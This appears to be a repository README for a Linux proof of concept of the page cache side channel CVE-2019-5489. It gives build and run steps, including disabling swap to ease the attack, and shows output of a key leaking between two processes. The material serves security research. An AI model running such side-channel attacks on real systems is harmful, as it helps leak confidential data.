# CVE 2019-5489
This repository contains Page Cache Side Channel Attacks (CVE-2019-5489) proof of concept for Linux.

In order to evaluate page cache side channel, I have implemented **covert channel** between two processes.
The sender process send confidential data to a receiver process via the page cache side channel.
Page cache attacks has been mitigated in Linux Kenrel 5.0 and later, so **this PoC will only work before Linux Kernel 5.0**.

NOTE: I've tested works on Ubuntu 18.04, Linux 4.15.0-70.

## Building
Run the following command.
```sh
git clone https://github.com/mmxsrup/CVE-2019-5489
cd CVE-2019-5489
make
```

## Running
Disable swap space to make attack easier.
```sh
swapoff -a
```
### Terminal 1
At first, run the following command on terminal 1.
```sh
make run-sender
```
### Terminal 2
After `sending 1th character ...` is output on the terminal 1, run the following command.
```sh
make run-receiver
```

## Output
If the execution is successful, the following will be output.  
This shows that the key was sent from the Sender process to the Reciver process via page cache side channel.
### Terminal 1
```txt
LD_LIBRARY_PATH=. ./sender
Sender process
ecicting page cache ...
sending 1th character ...
ecicting page cache ...
sending 2th character ...
ecicting page cache ...
sending 3th character ...
ecicting page cache ...
sending 4th character ...
ecicting page cache ...
sending 5th character ...
ecicting page cache ...
sending 6th character ...
ecicting page cache ...
sending 7th character ...
ecicting page cache ...
sending 8th character ...
ecicting page cache ...
sending 9th character ...
```
### Terminal 2
```txt
LD_LIBRARY_PATH=. ./receiver
Sender process
waiting ...
recved caracter(P)
waiting ...
recved caracter(a)
waiting ...
recved caracter(s)
waiting ...
recved caracter(s)
waiting ...
recved caracter(W)
waiting ...
recved caracter(o)
waiting ...
recved caracter(r)
waiting ...
recved caracter(d)
waiting ...
recved caracter()
Received key: PassWord
```

## References
- Daniel Gruss et al. Page cache attacks [CCS 19]
